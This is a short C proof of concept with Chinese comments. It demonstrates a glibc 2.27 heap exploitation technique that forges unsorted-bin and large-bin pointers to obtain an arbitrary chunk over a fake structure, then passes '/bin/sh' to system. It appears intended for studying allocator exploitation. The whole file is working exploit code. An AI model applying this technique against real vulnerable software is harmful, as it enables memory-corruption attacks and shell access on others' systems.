// gcc -ggdb -fpie -pie -o simple simple.c
// 單純利用 unlink 的特性在 fake 亂寫, https://www.anquanke.com/post/id/203096
// 注意必須開 pie 才能 work, 且有機率失敗 (見下方說明)
//
// 功能: 取得任意 chunk
// 條件: 一個在 unsorted bin 一個在 large bin, 且 fd bk fd_nextsize bk_nextsize 都要能寫
//       任意 chunk 的 size 必須為 0x51
//
// libc: 2.27


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct {
    char chunk_head[0x10];
    char content[0x10];
}fake;

int main(void)
{
    unsigned long *large_bin,*unsorted_bin;
    unsigned long *fake_chunk;
    char *ptr;

    // 填滿 tcache
    for( int i = 0; i<7; ++i)
        free(calloc(1, 0x48));

    // 一個在 unsorted bin, 一個在 large bin
    unsorted_bin=malloc(0x518);
    malloc(0X18);
    large_bin=malloc(0x508);
    malloc(0x18);
    
    free(large_bin);
    free(unsorted_bin);
    unsorted_bin=malloc(0x518);
    free(unsorted_bin);

    // unlink 會用到很難解釋
    fake_chunk=&fake;
    unsorted_bin[0]=0;
    unsorted_bin[1]=(unsigned long)fake_chunk;

    large_bin[0]=0;
    large_bin[1]=(unsigned long)fake_chunk+8;
    large_bin[2]=0;
    large_bin[3]=(unsigned long)fake_chunk-0x18-5; // -5 是為了讓 pie 的 0x55 或 0x56 擺到 fake 的 size

    /*
     * 0x48 是利用 best fit 的特性, 使得 unsorted bin traverse 那段直接 return, 但
     * malloc : 會從 tcache 拿 , 如果 tcache 是空的,  則會優先補滿 tcache, 導致失敗, 因此必須將 tcache 填滿且使用 calloc
     * calloc : 在 _int_malloc 之後會檢查(見下方連結), 可能導致失敗, 但當 size 為 0x56 時會因為 is_mmap bit 通過 assert 進而 get shell
     * https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
     */
    ptr=calloc(1, 0x48);
    strncpy(ptr, "/bin/sh", 0x48 - 1);
    system(fake.content);
}
